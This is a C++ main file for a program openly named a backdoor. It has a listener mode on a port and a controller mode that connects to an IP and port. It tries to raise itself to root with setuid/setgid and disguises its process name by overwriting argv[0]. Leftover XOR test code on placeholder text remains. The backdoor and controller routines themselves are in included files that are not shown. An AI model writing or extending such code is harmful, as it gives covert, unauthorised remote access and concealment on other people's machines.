#include "backdoor.cpp"
#include "controller.cpp"
#include "simpleencrypt.h"
#include "utilities.cpp"
#include <iostream>

int main(int argc, char *argv[]) {
    bool ControllerMode = false;
    bool BackdoorMode = false;
    bool HelpMode = false;
    __uid_t *uid;
    __gid_t *gid;

    int k = 1;
    for (k = 1; k < argc; k++) {
        if (*(argv[k] + 0) == '-') {
            if (*(argv[k] + 1) == 'h') {
                HelpMode = true;
            }
            if (*(argv[k] + 1) == 'c') {
                ControllerMode = true;
            }
            if (*(argv[k] + 1) == 'b') {
                BackdoorMode = true;
            }
        }
    }

    if (ControllerMode && BackdoorMode) {
        HelpMode = true;
    }
    if (!ControllerMode && !BackdoorMode) {
        HelpMode = true;
    }
    if (ControllerMode && argc < 4) {
        HelpMode = true;
    }
    if (BackdoorMode && argc < 3) {
        HelpMode = true;
    }
    if (argc == 1) {
        HelpMode = true;
    }

    if (HelpMode) {
        std::cout << "Controller: \n"
                  << "          Backdoor -c <ipaddress> <port>\n"
                  << "Backdoor: \n"
                  << "          Backdoor -b <port>\n"
                  << "Help: \n"
                  << "          Backdoor -h\n\n";
        return 1;
    }

    // elevate
    fprintf(stderr, "Obtaining UID and GID:\n");
    fprintf(stderr, "UID: %d GID:%d\n", getuid(), getgid());

    if (getuid() != 0 || getgid() != 0) {
        fprintf(stderr, "Elevating:\n");
        setuid(0);
        setgid(0);
        fprintf(stderr, "UID: %d GID:%d\n\n", getuid(), getgid());
    }

    // mask process
    fprintf(stderr, "Process name: %s\n", argv[0]);
    fprintf(stderr, "Masking\n");
    strcpy(argv[0], PROCESS_MASK);
    fprintf(stderr, "Process Name: %s\n\n", argv[0]);

    std::string data = "Lorem ipsum dictum sapien pharetram sapien pharetram "
                       "sapien pharetram sapien pharetra ";
    std::string encrypted = xor_data(data, data.length());
    std::cout << encrypted << std::endl;
    std::string decrypted = xor_data(encrypted, data.length());
    std::cout << decrypted << std::endl;

    // int rc = start_encrypt("Lorem ipsum dictum sapien pharetra etiam
    // condimentum .", encrypted); printf("%s\n%d\n", encrypted, rc); rc =
    // start_decrypt(encrypted, rc);

    if (ControllerMode) {
        if (controller(std::string(argv[2]), atoi(argv[3])) == -1) {
            return -1;
        }
    }
    if (BackdoorMode) {
        if (backdoor(atoi(argv[2])) == -1) {
            return -1;
        }
    }

    return 0;
}